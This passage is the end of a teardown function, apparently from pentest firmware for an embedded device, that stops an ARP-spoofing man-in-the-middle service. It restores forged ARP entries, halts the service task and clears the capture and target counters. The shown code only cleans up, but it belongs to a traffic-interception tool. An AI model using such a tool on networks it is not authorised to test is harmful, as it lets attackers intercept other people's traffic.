    // the `mitm.arp_restore_on_stop` tunable; leaving the forged entries behind
    // strands every host until its cache expires, so the Bruce port keeps the
    // restore unconditional.
    netspoof_arp_restore_all();
    s_svcRun = false;
    // Let the service task notice and exit on its own; it owns its own handle.
    for (int i = 0; i < 20 && s_svcTask; i++) vTaskDelay(pdMS_TO_TICKS(10));
    s_captureCount = 0;
    s_targetCount = 0;
}

#endif // !LITE_VERSION
